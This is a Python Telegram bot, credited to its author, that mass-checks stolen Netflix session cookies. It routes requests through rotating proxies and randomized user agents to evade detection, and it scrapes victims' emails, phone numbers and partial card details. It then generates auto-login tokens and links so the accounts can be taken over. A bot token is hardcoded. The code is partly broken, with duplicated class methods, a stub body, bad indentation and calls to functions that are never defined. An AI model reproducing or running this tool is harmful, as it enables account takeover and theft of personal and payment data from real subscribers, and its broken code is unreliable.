import re
import json
import time
import os
import threading
import requests
import urllib3
import urllib.parse
import zipfile
import io
import random
import logging
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, InputFile
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, filters, ContextTypes
from logging.handlers import RotatingFileHandler

# --- CONFIGURACIÓN GLOBAL ---
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# 🔑 TU TOKEN DE BOT AQUÍ (Recomiendo usar variables de entorno en producción)
BOT_TOKEN = "9224399752:AAE_iv908Ox4dO77MUdX84vVqXZmG0zPptw"
DEVELOPER = "(credito al creador) AXEL MOLINA"
VERSION = "3.0-TVS-FLOW"

# 🔒 ADMIN
ADMIN_IDS = [8917082484] 

# Directorios
os.makedirs("logs", exist_ok=True)
os.makedirs("hits", exist_ok=True)
os.makedirs("bad_cookies", exist_ok=True)

# Logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s', handlers=[
    RotatingFileHandler("logs/bot.log", maxBytes=10*1024*1024, backupCount=5, encoding='utf-8'),
    logging.StreamHandler()
])
logger = logging.getLogger(__name__)

# 🛡️ Anti-Spam
SPAM_WORDS = ['luckybear', 'казино', 'casino', 'bond', 'wndpr', 'lucky', 'bear', 'ставки', 'ставка', 'играть', 'выигрыш', 'приз', 'bonus', 't.me/', 'https://t.me/', 'https://wndpr', 'https://bond']

# 🌍 Países y Banderas
COUNTRY_FLAGS = {"US":"🇺🇸","GB":"🇬🇧","DE":"🇩🇪","FR":"🇫🇷","ES":"🇪🇸","IT":"🇮🇹","TR":"🇹🇷","BR":"🇧🇷","JP":"🇯🇵","KR":"🇰🇷","IN":"🇮🇳","CA":"🇨🇦","AU":"🇦🇺","MX":"🇲🇽","NL":"🇳🇱","SE":"🇸🇪","NO":"🇳🇴","DK":"🇩🇰","FI":"🇫🇮","PL":"🇵🇱","RU":"🇷🇺","AR":"🇦🇷","CL":"🇨🇱","CO":"🇨🇴","PE":"🇵🇪","AE":"🇦🇪","SA":"🇸🇦","EG":"🇪🇬","ZA":"🇿🇦","ID":"🇮🇩","MY":"🇲🇾","SG":"🇸🇬","TH":"🇹🇭","VN":"🇻🇳","PH":"🇵🇭","KE":"🇰🇪","NG":"🇳🇬","GH":"🇬🇭","PT":"🇵🇹","RO":"🇷🇴","HU":"🇭🇺","CZ":"🇨🇿","UA":"🇺🇦","AT":"🇦🇹","CH":"🇨🇭","BE":"🇧🇪","IL":"🇮🇱","TW":"🇹🇼","HK":"🇭🇰","PK":"🇵🇰","BO":"🇧🇴","GT":"🇬🇹","EC":"🇪🇨","UY":"🇺🇾","NZ":"🇳🇿","ZW":"🇿🇼","SK":"🇸🇰","HR":"🇭🇷","RS":"🇷🇸","BG":"🇧🇬"}
COUNTRY_NAMES = {"US":"United States","GB":"United Kingdom","DE":"Germany","FR":"France","ES":"Spain","IT":"Italy","TR":"Turkey","BR":"Brazil","JP":"Japan","KR":"South Korea","IN":"India","CA":"Canada","AU":"Australia","MX":"Mexico","NL":"Netherlands","SE":"Sweden","NO":"Norway","DK":"Denmark","FI":"Finland","PL":"Poland","RU":"Russia","AR":"Argentina","CL":"Chile","CO":"Colombia","PE":"Peru","AE":"UAE","SA":"Saudi Arabia","EG":"Egypt","ZA":"South Africa","ID":"Indonesia","MY":"Malaysia","SG":"Singapore","TH":"Thailand","VN":"Vietnam","PH":"Philippines","KE":"Kenya","NG":"Nigeria","GH":"Ghana","PT":"Portugal","RO":"Romania","HU":"Hungary","CZ":"Czech Republic","UA":"Ukraine","AT":"Austria","CH":"Switzerland","BE":"Belgium","IL":"Israel","TW":"Taiwan","HK":"Hong Kong","PK":"Pakistan","NZ":"New Zealand","SK":"Slovakia","HR":"Croatia","RS":"Serbia","BG":"Bulgaria"}

def _djs(s):
    if not s: return ""
    s = re.sub(r'\\x([0-9a-fA-F]{2})', lambda m: chr(int(m.group(1), 16)), s)
    s = re.sub(r'\\u([0-9a-fA-F]{4})', lambda m: chr(int(m.group(1), 16)), s)
    return s.strip()

def _rx(pattern, text, default=""):
    m = re.search(pattern, text, re.S)
    return m.group(1) if m else default

def _rx_all(pattern, text):
    return re.findall(pattern, text, re.S)

def _flag(cc):
    return COUNTRY_FLAGS.get((cc or "").upper(), "🌍")

def _country(cc):
    return COUNTRY_NAMES.get((cc or "").upper(), cc or "Unknown")

# --- Lógica de Cookies ---

def parse_netscape(text):
    cookies = {}
    for line in text.splitlines():
        line = line.strip()
        if not line or line.startswith("#"): continue
        parts = line.split("\t")
        if len(parts) >= 7: cookies[parts[5]] = parts[6]
    return cookies

def parse_json_cookies(text):
    try:
        data = json.loads(text)
        if isinstance(data, list): return {c["name"]: c["value"] for c in data if "name" in c and "value" in c}
        if isinstance(data, dict): return data
    except: pass
    return {}

def load_cookies(text):
    text = text.strip()
    if text.startswith("[") or text.startswith("{"):
        c = parse_json_cookies(text)
        if c: return c
    c = parse_netscape(text)
    if c: return c
    cookies = {}
    for part in re.split(r"[;\n]", text):
        part = part.strip()
        if "=" in part:
            k, _, v = part.partition("=")
            k, v = k.strip(), v.strip()
            if k: cookies[k] = v
    return cookies

def extract_from_zip(zip_data):
    """Extrae texto de un archivo ZIP"""
    extracted_text = []
    try:
        with zipfile.ZipFile(io.BytesIO(zip_data)) as z:
            for file in z.namelist():
                if file.endswith('.txt') or file.endswith('.csv'):
                    extracted_text.append(z.read(file).decode('utf-8'))
    except Exception as e:
        logger.error(f"Error extrayendo ZIP: {e}")
    return "\n".join(extracted_text)

# --- Lógica de Netflix y Stealth Avanzado ---

_IOS_API = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"
_IOS_PARAMS = {"appVersion":"15.48.1","config":'{"gamesInTrailersEnabled":"false","isTrailersEvidenceEnabled":"false","cdsMyListSortEnabled":"true","kidsBillboardEnabled":"true","billboardEnabled":"true","sharksEnabled":"true","useCDSGalleryEnabled":"true","avifFormatEnabled":"false"}',"device_type":"NFAPPL-02-","esn":"NFAPPL-02-IPHONE8%3D1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200","idiom":"phone","iosVersion":"15.8.5","isTablet":"false","languages":"en-US","locale":"en-US","maxDeviceWidth":"375","model":"saget","modelType":"IPHONE8-1","odpAware":"true","path":'["account","token","default"]',"pathFormat":"graph","pixelDensity":"2.0","progressive":"false","responseFormat":"json"}
_IOS_HEADERS = {"User-Agent":"Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)","x-netflix.request.attempt":"1","x-netflix.request.client.user.guid":"A4CS633D7VCBPE2GPK2HL4EKOE","x-netflix.context.profile-guid":"A4CS633D7VCBPE2GPK2HL4EKOE","x-netflix.request.routing":'{"path":"/nq/mobile/nqios/~15.48.0/user","control_tag":"iosui_argo"}',"x-netflix.context.app-version":"15.48.1","x-netflix.argo.translated":"true","x-netflix.context.form-factor":"phone","x-netflix.context.sdk-version":"2012.4","x-netflix.client.appversion":"15.48.1","x-netflix.context.max-device-width":"375","x-netflix.context.ab-tests":"","x-netflix.tracing.cl.useractionid":"4DC655F2-9C3C-4343-8229-CA1B003C3053","x-netflix.client.type":"argo","x-netflix.client.ftl.esn":"NFAPPL-02-IPHONE8=1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200","x-netflix.context.locales":"en-US","x-netflix.context.top-level-uuid":"90AFE39F-ADF1-4D8A-B33E-528730990FE3","x-netflix.client.iosversion":"15.8.5","accept-language":"en-US;q=1","x-netflix.argo.abtests":"","x-netflix.context.os-version":"15.8.5","x-netflix.request.client.context":'{"appState":"foreground"}',"x-netflix.context.ui-flavor":"argo","x-netflix.argo.nfnsm":"9","x-netflix.context.pixel-density":"2.0","x-netflix.request.toplevel.uuid":"90AFE39F-ADF1-4D8A-B33E-528730990FE3","x-netflix.request.client.timezoneid":"Asia/Dhaka"}

# User Agents aleatorios para stealth
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3.1 Safari/605.1.15",
    "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36"
]

def generate_nftoken(netflix_id_raw, timeout=15, proxy=None):
    """Genera token usando API iOS y fallback Android, con rotación de UA y delays"""
    if not netflix_id_raw: return None
    netflix_id = urllib.parse.unquote(str(netflix_id_raw))
    proxies = {"http": proxy, "https": proxy} if proxy else None

    # Intento iOS
    headers = dict(_IOS_HEADERS)
    headers["Cookie"] = f"NetflixId={netflix_id}"
    # Rotar UA ocasionalmente para parecer humano
    if random.random() > 0.7:
        headers["User-Agent"] = random.choice(USER_AGENTS[:1])
    
    try:
        # Delay simulado
        time.sleep(random.uniform(0.5, 1.5))
        r = requests.get(_IOS_API, params=_IOS_PARAMS, headers=headers, proxies=proxies, timeout=timeout, verify=False)
        if r.status_code == 200:
            data = r.json()
            token_data = ((((data.get("value") or {}).get("account") or {}).get("token") or {}).get("default") or {})
            tok = token_data.get("token")
            if tok: return str(tok)
    except: pass

    # Intento Android (Fallback)
    try:
        sess2 = requests.Session()
        sess2.cookies.set("NetflixId", netflix_id, domain=".netflix.com", path="/")
        if proxies: sess2.proxies, sess2.verify = proxies, False

        ua_android = "com.netflix.mediaclient/63884 (Linux; U; Android 13)"
        if random.random() > 0.5:
             ua_android = f"Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36"

        payload = {"operationName":"CreateAutoLoginToken","variables":{"scope":"WEBVIEW_MOBILE_STREAMING"},"extensions":{"persistedQueries":{"version":102,"id":"76e97129-f4b5-41a0-a73c-12e674896849"}}}

        time.sleep(random.uniform(0.5, 1.5))
        r2 = sess2.post("https://android13.prod.ftl.netflix.com/graphql", json=payload, headers={
            "User-Agent": ua_android,
            "Accept":"application/json",
            "Content-Type":"application/json"
        }, timeout=timeout)

        if r2.status_code == 200:
            d = r2.json()
            tok = (d.get("data") or {}).get("createAutoLoginToken")
            if tok: return str(tok)
    except: pass
    return None

def check_account(cookies: dict, proxy=None, timeout=20):
    """Verifica cuenta y extrae datos con stealth y validación Open/Mose"""
    if not any(cookies.get(k) for k in ["NetflixId","SecureNetflixId"]): return None

    sess = requests.Session()
    # UA aleatoria para la sesión principal
    sess.headers.update({
        "User-Agent": random.choice(USER_AGENTS),
        "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language":"en-US,en;q=0.9",
        "DNT":"1"
    })

    for k, v in cookies.items(): sess.cookies.set(k, str(v), domain=".netflix.com", path="/")
    if proxy: sess.proxies, sess.verify = {"http":proxy,"https":proxy}, False

    try:
        # Peticion a /account para obtener datos JSON ocultos
        time.sleep(random.uniform(0.2, 0.8)) # Simula lectura humana
        r = sess.get("https://www.netflix.com/account", allow_redirects=True, timeout=timeout)
    except: return None

    if "login" in r.url.lower() or r.status_code in (401,403): return None

    html = r.text
    if '"membershipStatus":"CURRENT_MEMBER"' not in html: return None

    # Extracción de datos
    email = _djs(_rx(r'"emailAddress":"([^"]+)"', html))
    name = _djs(_rx(r'"userInfo":\{"name":"([^"]+)"', html))
    if not name: name = _djs(_rx(r'"firstName":"([^"]+)"', html))

    cc = _rx(r'"countryOfSignup":"([A-Z]{2,3})"', html, "XX")
    since = _djs(_rx(r'"memberSince":"([^"]+)"', html))
    if not since:
        ts_raw = _rx(r'"memberSince":\{"fieldType":"Numeric","value":(\d+)\}', html)
        if ts_raw and ts_raw.isdigit():
            try: since = datetime.utcfromtimestamp(int(ts_raw)/1000).strftime("%B %Y")
            except: since = "N/A"

    plan = _djs(_rx(r'"localizedPlanName":\{"fieldType":"String","value":"([^"]+)"\}', html))
    plan_id = _rx(r'"planId":\{"fieldType":"String","value":"([^"]+)"\}', html)
    price = _djs(_rx(r'"planPrice":\{"fieldType":"String","value":"([^"]+)"\}', html))

    q_raw = _rx(r'"videoQuality":\{"fieldType":"String","value":"([^"]+)"\}', html).upper()
    quality_map = {"UHD":"UHD 4K","FHD":"FHD 1080p","HD":"HD 720p","SD":"SD 480p"}
    quality = quality_map.get(q_raw, q_raw or "N/A")

    streams = _rx(r'"maxStreams":\{"fieldType":"Numeric","value":(\d+)\}', html, "N/A")
    nextbill = _djs(_rx(r'"nextBillingDate":\{"fieldType":"String","value":"([^"]+)"\}', html))

    _pm_start = html.find('"paymentMethods"')
    pm_raw = html[_pm_start:_pm_start+3000] if _pm_start>=0 else ""
    card_brand = _rx(r'"paymentOptionLogo":"([^"]+)"', pm_raw)
    if not card_brand: card_brand = _rx(r'"type":\{"fieldType":"String","value":"([^"]+)"\}', pm_raw)
    pay_type = _rx(r'"paymentMethod":\{"fieldType":"String","value":"([^"]+)"\}', pm_raw)
    card_last4 = _rx(r'"GrowthCardPaymentMethod"[^}]*"displayText":"([^"]+)"', pm_raw)
    if not card_last4: card_last4 = _rx(r'"displayText":\{"fieldType":"String","value":"([^"]+)"\}', pm_raw)

    phone = _djs(_rx(r'"phoneNumber":"([^"]*)"', html)) or "N/A"
    pv_raw = _rx(r'"isPhoneVerified":(?:\{"fieldType":"Boolean","value":)?(true|false)', html)
    phone_verified = pv_raw == "true"

    extra_raw = _rx(r'"extraMemberSlots":\{"fieldType":"Numeric","value":(\d+)\}', html, "0")
    extra_slots = int(extra_raw) if extra_raw.isdigit() else 0

    can_change = '"canChangePlan":{"fieldType":"Boolean","value":true}' in html
    free_trial = '"isInFreeTrial":true' in html

    profiles = [_djs(p) for p in _rx_all(r'"profileName":"([^"]+)"', html)]
    if not profiles: profiles = [_djs(p) for p in _rx_all(r'"profileName":\{"fieldType":"String","value":"([^"]+)"\}', html)]

    seen = set()
    profiles_clean = []
    for p in profiles:
        if p and p not in seen: seen.add(p); profiles_clean.append(p)

    user_guid = _rx(r'"userGuid":"([^"]+)"', html)
    netflix_id_raw = cookies.get("NetflixId","")

    # Generar Token (Validación Open/Mose)
    tok = generate_nftoken(netflix_id_raw, timeout, proxy=proxy) if netflix_id_raw else None

    # URLs de Login
    if tok:
        tok_safe = urllib.parse.quote(tok, safe="")
        login_pc = f"https://netflix.com/?nftoken={tok_safe}"
        login_phone = f"https://netflix.com/unsupported?nftoken={tok_safe}"
        # URL TV Optimizada (Flujo Invertido)
        login_tv = f"https://www.netflix.com/tv2" 
    else:
        login_pc, login_phone, login_tv = "N/A", "N/A", "https://www.netflix.com/tv2"

    display_name = name or (profiles_clean[0] if profiles_clean else "N/A")

    return {
        "email":email or "N/A","name":display_name,"country_code":cc,"country":_country(cc),
        "plan":plan or "N/A","plan_id":plan_id or "N/A","price":price or "N/A",
        "member_since":since or "N/A","next_billing":nextbill or "N/A","free_trial":free_trial,
        "can_change":can_change,"video_quality":quality,"max_streams":str(streams),
        "extra_slots":extra_slots,"card_brand":card_brand or "N/A","card_last4":card_last4 or "N/A",
        "payment_method":pay_type or "N/A","phone":phone,"phone_verified":phone_verified,
        "profiles":profiles_clean,"profile_count":len(profiles_clean),"user_guid":user_guid or "N/A",
        "netflix_id_raw":netflix_id_raw,"login_pc":login_pc,"login_phone":login_phone,
        "login_tv":login_tv, "nftoken": tok
    }

class NetflixChecker:
    def __init__(self, threads=5, proxy_list=None, timeout=20):
        self.threads = threads
        self.timeout = timeout
        self._proxy_list = proxy_list if proxy_list else []
        self._proxy_index = 0
        self.lock = threading.Lock()
        self.stats = {"total":0,"checked":0,"hits":0,"bad":0,"errors":0,"start":time.time()}
        self.hits = []
        self.bad_cookies = []

    def _next_proxy(self):
        if not self._proxy_list: return None
        with self.lock:
            p = self._proxy_list[self._proxy_index % len(self._proxy_list)]
            self._proxy_index += 1
        if p and not p.startswith(("http://","https://","socks4://","socks5://")): p = "http://"+p
        return p

    def process_cookie(self, cookie_text):
        cookies = load_cookies(cookie_text)
        try:
            result = check_account(cookies, proxy=self._next_proxy(), timeout=self.timeout)
        except:
            with self.lock: self.stats["errors"]+=1; self.stats["checked"]+=1
            return None

        with self.lock:
            self.stats["checked"]+=1
            if result:
                self.stats["hits"]+=1
                result["cookie_raw"] = cookie_text.strip()
                self.hits.append(result)
                self._save_hit(result, cookie_text)
                return result
            else:
                self.stats["bad"]+=1
                self.bad_cookies.append(cookie_text.strip())
                return None

    def process_batch(self, cookies_list):
        self.stats["total"], self.stats["start"] = len(cookies_list), time.time()
        results = []
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = [executor.submit(self.process_cookie, c) for c in cookies_list if c.strip()]
    def _next_proxy(self):
        if not self._proxy_list: return None
        with self.lock:
            p = self._proxy_list[self._proxy_index % len(self._proxy_list)]
            self._proxy_index += 1
        if p and not p.startswith(("http://","https://","socks4://","socks5://")): p = "http://"+p
        return p

    def process_cookie(self, cookie_text):
        # ... (cuerpo de process_cookie) ...
        pass 

    def process_batch(self, cookies_list):
        self.stats["total"], self.stats["start"] = len(cookies_list), time.time()
        results = []
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = [executor.submit(self.process_cookie, c) for c in cookies_list if c.strip()]
            for future in as_completed(futures):
                try:
                    result = future.result()
                    if result: results.append(result)
                except: pass
        return results

        

class NetflixCheckerBot:
        def __init__(self, token, proxy_file="proxies.txt"):
        self.token = token
        
        # Construir la app pasando los kwargs directamente en .build()
        self.app = Application.builder().token(token).build(
            request_kwargs={
                "connect_timeout": 10,
                "read_timeout": 20,
                "write_timeout": 10
            }
        )

        # Cargar proxies
        proxy_list = []
        if os.path.exists(proxy_file):
            with open(proxy_file, 'r') as f:
                proxy_list = [line.strip() for line in f if line.strip()]
        
        self.checker = NetflixChecker(threads=5, proxy_list=proxy_list, timeout=20)
        self.user_sessions = {}
        self.tv_codes_pending = {}

        # Handlers
        self.app.add_handler(CommandHandler("start", self.start_command))
        self.app.add_handler(CommandHandler("help", self.help_command))
        self.app.add_handler(CommandHandler("stats", self.stats_command))
        self.app.add_handler(CommandHandler("logs", self.logs_command))
        self.app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, self.handle_message))
        self.app.add_handler(MessageHandler(filters.Document.ALL, self.handle_document))

    def is_admin(self, user_id):
        return user_id in ADMIN_IDS

    async def start_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user = update.effective_user
        await update.message.reply_text(
            f"<b>╔══════════════════════════════════════╗</b>\n"
            f"<b>║     🎬 NETFLIX CHECKER BOT v{VERSION}    ║</b>\n"
            f"<b>╚══════════════════════════════════════╝</b>\n\n"
            f"<b>👨‍💻 Dev:</b> {DEVELOPER}\n\n"
            f"📤 <b>Envía:</b> Un Cookie, Lista .TXT o .ZIP\n"
            f"🎯 /help - Comandos disponibles\n\n"
            f"🛡️ <b>AntiSpam + Stealth IP Activado</b>",
            parse_mode="HTML"
        )

    async def help_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        await update.message.reply_text(
            f"<b>╔══════════════════════════════════════╗</b>\n"
            f"<b>║        📚 COMANDOS                   ║</b>\n"
            f"<b>╚══════════════════════════════════════╝</b>\n\n"
            f"📤 <b>Archivos:</b> Sube .txt o .zip con cookies\n"
            f"🎬 /start - Menú principal\n"
            f"📋 /help - Ayuda\n"
            f"❌ /cancel - Cancelar cola actual\n\n"
            f"🔒 /stats y /logs - Solo ADM",
            parse_mode="HTML"
        )

    async def stats_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if not self.is_admin(update.effective_user.id):
            await update.message.reply_text("🔒 Acceso restringido.", parse_mode="HTML")
            return
        if self.checker.stats["checked"] == 0:
            await update.message.reply_text("📊 Sin datos aún.")
            return
        stats = self.checker.get_stats()
        await update.message.reply_text(
            f"<b>📊 ESTADÍSTICAS</b>\n\n"
            f"✅ Checkeados: {stats['checked']}\n"
            f"🎯 Hits: {stats['hits']}\n"
            f"❌ Malas: {stats['bad']}\n"
            f"⏱ Tiempo: {stats['elapsed']}\n"
            f"🚀 Velocidad: {stats['cpm']}",
            parse_mode="HTML"
        )

    async def logs_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if not self.is_admin(update.effective_user.id): return
        try:
            logs_text = "<b>📝 ÚLTIMOS HITs:</b>\n"
            if os.path.exists("logs/hits.log"):
                with open("logs/hits.log","r") as f: hits = f.readlines()[-5:]
                if hits:
                    for h in hits: logs_text += f"• {h.strip()[-80:]}\n"
            await update.message.reply_text(logs_text if logs_text!="" else "Sin logs.", parse_mode="HTML")
        except: await update.message.reply_text("❌ Error.")

    async def cancel_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        self.user_sessions[user_id] = []
        self.tv_codes_pending.pop(user_id, None)
        await update.message.reply_text("❌ Cancelado.")

    async def handle_message(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user = update.effective_user
        message_text = update.message.text
        user_id = user.id

        # 1. Manejo del Flujo Invertido TV
        if user_id in self.tv_codes_pending:
            code = self.tv_codes_pending[user_id]
            del self.tv_codes_pending[user_id]

            if self.checker.hits:
                last_hit = self.checker.hits[-1]
                if last_hit.get('nftoken'):
                    tok_safe = urllib.parse.quote(last_hit['nftoken'], safe="")
                    tv_url = f"https://www.netflix.com/activate?code={code}&lang=en"

                    caption = (
                        f"<b>📺 FLUJO INVERTIDO ACTIVADO</b>\n\n"
                        f"Tu código <b>{code}</b> ha sido vinculado.\n\n"
                        f"🔗 <b>Enlace Directo para Smart TV:</b>\n"
                        f"<code>{tv_url}</code>\n\n"
                        f"Abre este enlace en tu Smart TV o introduce el código en netflix.com/activate"
                    )
                    await update.message.reply_text(caption, parse_mode="HTML")
                    return
                else:
                    await update.message.reply_text("❌ No se encontró un token válido reciente para generar el link de TV.")
                    return

        # 2. Spam Check
        if any(word in message_text.lower() for word in SPAM_WORDS):
            try: await update.message.delete()
            except: pass
            return

        # 3. Detectar si es cookie directa
        if any(k in message_text.lower() for k in ['netflixid','securenflixid','.netflix.com']):
            await update.message.reply_text("🔍 Verificando cookie...")
            result = self.checker.process_cookie(message_text)
            if result:
                await self.send_hit_message(update, result)
            else:
                await update.message.reply_text("❌ Cookie inválida o expirada.")
        else:
            # Acumular en cola
            if user_id not in self.user_sessions: self.user_sessions[user_id] = []

            cookies = load_cookies(message_text)
            if cookies:
                self.user_sessions[user_id].append(message_text)
                count = len(self.user_sessions[user_id])
                await update.message.reply_text(f"📦 Cookie guardada! ({count} en cola)\n\n<b>Usa los botones abajo para procesar</b>", parse_mode="HTML")
            else:
                await update.message.reply_text("❌ Formato no reconocido. Envía un Cookie o archivo.", parse_mode="HTML")

    async def handle_document(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user = update.effective_user
        doc = update.message.document
        user_id = user.id

        if doc.file_name.endswith('.zip'):
            file_obj = await context.bot.get_file(doc.file_id)
            zip_data = await file_obj.download_as_bytearray()
            text_content = extract_from_zip(bytes(zip_data))
            if not text_content:
                await update.message.reply_text("❌ No se encontraron textos en el ZIP.")
                return

            await update.message.reply_text("📂 Descomprimiendo...")

            if user_id not in self.user_sessions: self.user_sessions[user_id] = []

            lines = [line.strip() for line in text_content.split('\n') if line.strip()]
            self.user_sessions[user_id].extend(lines)

            await update.message.reply_text(f"✅ ZIP procesado. {len(lines)} cookies cargadas.", parse_mode="HTML")

        elif doc.file_name.endswith('.txt'):
            file_obj = await context.bot.get_file(doc.file_id)
            text_content = (await file_obj.download_as_bytearray()).decode('utf-8', errors='ignore')

            await update.message.reply_text("📄 Leyendo TXT...")

            if user_id not in self.user_sessions: self.user_sessions[user_id] = []

            lines = [line.strip() for line in text_content.split('\n') if line.strip()]
            self.user_sessions[user_id].extend(lines)

            await update.message.reply_text(f"✅ TXT cargado. {len(lines)} cookies listas.", parse_mode="HTML")
        else:
            await update.message.reply_text("❌ Solo soporto .zip y .txt")

    async def send_hit_message(self, update: Update, acc):
        cc = acc.get("country_code","XX")
        flag = _flag(cc)
        profs = ", ".join(acc["profiles"][:4]) if acc["profiles"] else "N/A"
        pv = "✅" if acc.get("phone_verified") else "❌"
        nf_id = acc.get("netflix_id_raw","")
        cookie_val = f"NetflixId={nf_id}" if nf_id else acc.get("cookie_raw","")

        caption = (
            f"<b>╔══════════════════════════════════════╗</b>\n"
            f"<b>║     🎬 NETFLIX PREMIUM HIT           ║</b>\n"
            f"<b>╚══════════════════════════════════════╝</b>\n\n"
            f"<b>👤 Nombre:</b> {acc['name']}\n"
            f"<b>📧 Email:</b> <code>{acc['email']}</code>\n"
            f"<b>🌍 País:</b> {acc['country']} {flag} ({cc})\n\n"
            f"<b>╭─────────────────────────────────╮</b>\n"
            f"<b>│  📋 {acc['plan']}  •  💰 {acc['price']}</b>\n"
            f"<b>│  📅 Desde:</b> {acc['member_since']}\n"
            f"<b>│  🗓 Próximo cobro:</b> {acc['next_billing']}\n"
            f"<b>│  🎁 Trial:</b> {'Sim' if acc['free_trial'] else 'No'}\n"
            f"<b>╰─────────────────────────────────╯</b>\n\n"
            f"<b>╭─────────────────────────────────╮</b>\n"
            f"<b>│  🎥 Calidad:</b> {acc['video_quality']}\n"
            f"<b>│  📺 Pantallas:</b> {acc['max_streams']}\n"
            f"<b>│  ➕ Extra:</b> {acc['extra_slots']}\n"
            f"<b>│  💳 Tarjeta:</b> {acc['card_brand']} ****{acc['card_last4']}\n"
            f"<b>│  📞 Tel:</b> {acc['phone']}  {pv}\n"
            f"<b>│  👥 Perfiles:</b> {acc['profile_count']} ({profs})\n"
            f"<b>╰─────────────────────────────────╯</b>\n\n"
            f"<b>🔗 ACCESO DIRECTO:</b>\n\n"
            f"👨‍💻 {DEVELOPER}"
        )

        buttons = []
        row1 = []
        if acc.get("login_pc") and acc["login_pc"] != "N/A":
            row1.append(InlineKeyboardButton("🖥 PC", url=acc["login_pc"]))
        if acc.get("login_phone") and acc["login_phone"] != "N/A":
            row1.append(InlineKeyboardButton("📱 Móvil", url=acc["login_phone"]))
        if row1: buttons.append(row1)

        if acc.get("login_tv") and acc["login_tv"] != "N/A":
            buttons.append([InlineKeyboardButton("📺 Activar TV (Inverso)", callback_data=f'tv_{acc.get("nftoken", "")}')])
        else:
            buttons.append([InlineKeyboardButton("📺 TV", url="https://www.netflix.com/tv2")])

        markup = InlineKeyboardMarkup(buttons)

        if len(caption) > 4000:
            caption = caption[:3900] + "...\n\n👨‍💻 " + DEVELOPER

        await update.message.reply_text(caption, parse_mode="HTML", reply_markup=markup)

    async def button_handler(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        query = update.callback_query
        await query.answer()
        user_id = query.from_user.id

        if query.data.startswith('tv_'):
            self.tv_codes_pending[user_id] = True
            await query.edit_message_text("📺 Ingresa el código único de tu Smart TV (ej: 6578-6534):")
        else:
            pass

    def run(self):
        logger.info(f"Bot iniciado - Dev: {DEVELOPER} - STEALTH MODE")
        self.app.add_handler(CommandHandler("cancel", self.cancel_command))
        self.app.add_handler(MessageHandler(filters.Regex('^/done$'), self.done_command))
        self.app.add_handler(CallbackQueryHandler(self.button_handler))
        self.app.run_polling()

    async def done_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        if user_id in self.user_sessions and self.user_sessions[user_id]:
            cookies_list = self.user_sessions[user_id]
            await update.message.reply_text(f"🔄 Procesando {len(cookies_list)} cookies...")
            results = self.checker.process_batch(cookies_list)

            self.checker.save_bad_cookies()

            if results:
                await update.message.reply_text(f"✅ ¡{len(results)} HITS ENCONTRADOS!")
                for acc in results:
                    await self.send_hit_message(update, acc)
            else:
                await update.message.reply_text("❌ Ningún hit válido encontrado.")
            self.user_sessions[user_id] = []
        else:
            await update.message.reply_text("ℹ️ Cola vacía.")


if __name__ == "__main__":
    bot = NetflixCheckerBot("9224399752:AAE_iv908Ox4dO77MUdX84vVqXZmG0zPptw")
    bot.run()
 
